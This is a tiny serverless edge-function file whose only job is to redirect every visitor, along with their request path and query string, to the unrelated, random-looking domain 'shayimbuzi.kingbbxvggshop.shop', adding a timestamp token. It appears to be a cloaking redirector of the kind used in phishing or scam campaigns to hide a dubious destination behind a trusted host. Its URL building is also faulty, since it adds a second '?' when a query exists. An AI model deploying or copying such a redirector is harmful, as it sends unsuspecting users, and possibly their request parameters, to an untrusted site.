export const config = { runtime: "edge" };

export default function handler(req) {
  const url = new URL(req.url);

  const token = "vcl-" + Date.now();

  return Response.redirect(
    "https://shayimbuzi.kingbbxvggshop.shop" +
      url.pathname +
      url.search +
      `?token=${token}`,
    302
  );
}
